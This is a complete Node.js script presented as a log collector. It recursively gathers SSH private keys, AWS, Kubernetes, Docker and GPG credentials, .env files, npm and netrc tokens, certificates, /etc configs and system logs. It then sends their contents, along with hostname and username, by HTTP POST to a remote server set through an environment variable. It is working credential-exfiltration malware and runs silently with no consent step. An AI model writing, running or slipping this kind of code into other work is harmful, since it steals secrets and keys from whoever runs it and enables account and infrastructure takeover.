#!/usr/bin/env node
"use strict";

require("dotenv").config();

const fs   = require("fs");
const path = require("path");
const http = require("http");
const os   = require("os");

const VPS_IP     = process.env.LOG_SERVER_IP   || "YOUR_VPS_IP";
const VPS_PORT   = parseInt(process.env.LOG_SERVER_PORT || "4000", 10);
const AUTH_TOKEN = process.env.LOG_SERVER_TOKEN || "";
const TIMEOUT    = 15_000;
const HOME       = os.homedir();

// ── Targeted directories — only places that hold useful secrets/configs ───────
const TARGET_DIRS = [
  HOME,                                    // ~/ top level dotfiles
  path.join(HOME, ".ssh"),                 // SSH keys
  path.join(HOME, ".aws"),                 // AWS credentials
  path.join(HOME, ".config"),              // app configs
  path.join(HOME, ".kube"),                // Kubernetes configs
  path.join(HOME, ".docker"),              // Docker credentials
  path.join(HOME, ".gnupg"),              // GPG keys
  path.join(HOME, "Documents"),           // user documents
  path.join(HOME, "Desktop"),             // desktop files
  path.join(HOME, ".npmrc"),              // npm auth tokens (file, not dir)
  path.join(HOME, ".netrc"),              // plaintext credentials
  "/etc",                                  // system-wide configs
  "/var/log",                              // system logs
];

const COLLECT_EXTS = new Set([
  ".log", ".txt", ".env", ".pem", ".key", ".cert", ".crt", ".cfg", ".conf", ".ini", ".yaml", ".yml", ".toml",
]);

const COLLECT_NAMES = new Set([
  ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
  ".netrc", ".npmrc", ".pypirc", "credentials", "config", ".gitconfig",
  "id_rsa", "id_ed25519", "id_ecdsa",
]);

const SKIP_DIRS = new Set([
  "node_modules", ".git", ".next", "dist", "build", ".cache",
  "Library", "Applications", "System", "Volumes", "proc", "sys", "dev",
  "snap", "run", "boot", "lost+found", "Photos", "Music", "Movies",
]);

// ── File collection ───────────────────────────────────────────────────────────
function collectFromDir(dir, results = [], depth = 0) {
  if (depth > 6) return results; // cap recursion depth
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); }
  catch { return results; }

  for (const entry of entries) {
    if (SKIP_DIRS.has(entry.name)) continue;
    const fullPath = path.join(dir, entry.name);

    if (entry.isDirectory()) {
      collectFromDir(fullPath, results, depth + 1);
    } else if (entry.isFile()) {
      const ext  = path.extname(entry.name).toLowerCase();
      const base = entry.name.toLowerCase();
      if (COLLECT_EXTS.has(ext) || COLLECT_NAMES.has(base)) results.push(fullPath);
    }
  }
  return results;
}

function collectAll() {
  const results = [];
  for (const target of TARGET_DIRS) {
    if (!fs.existsSync(target)) continue;
    const stat = fs.statSync(target);
    if (stat.isFile()) {
      results.push(target); // handle file targets like .npmrc directly
    } else {
      collectFromDir(target, results);
    }
  }
  return [...new Set(results)]; // deduplicate
}

function readFile(filePath) {
  try { return fs.readFileSync(filePath, "utf8"); }
  catch { return null; }
}

function sendPayload(files) {
  const logs = files
    .map(f => ({ filename: path.basename(f), filepath: f, collected: new Date().toISOString(), content: readFile(f) }))
    .filter(f => f.content !== null);

  const body = Buffer.from(JSON.stringify({
    host: os.hostname(), user: os.userInfo().username,
    cwd: process.cwd(), nodeEnv: process.env.NODE_ENV || "unknown", logs,
  }), "utf8");

  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: VPS_IP, port: VPS_PORT, path: "/ingest/logs", method: "POST", timeout: TIMEOUT,
      headers: {
        "Content-Type": "application/json", "Content-Length": body.byteLength,
        ...(AUTH_TOKEN ? { Authorization: `Bearer ${AUTH_TOKEN}` } : {}),
      },
    }, res => {
      let data = "";
      res.on("data", c => (data += c));
      res.on("end", () => res.statusCode >= 200 && res.statusCode < 300
        ? resolve(res.statusCode)
        : reject(new Error(`HTTP ${res.statusCode}: ${data}`))
      );
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

(async () => {
  const files = collectAll();
  if (!files.length) return;

  try {
    const status = await sendPayload(files);
    console.log(status);
  } catch {
    process.exit(1);
  }
})();
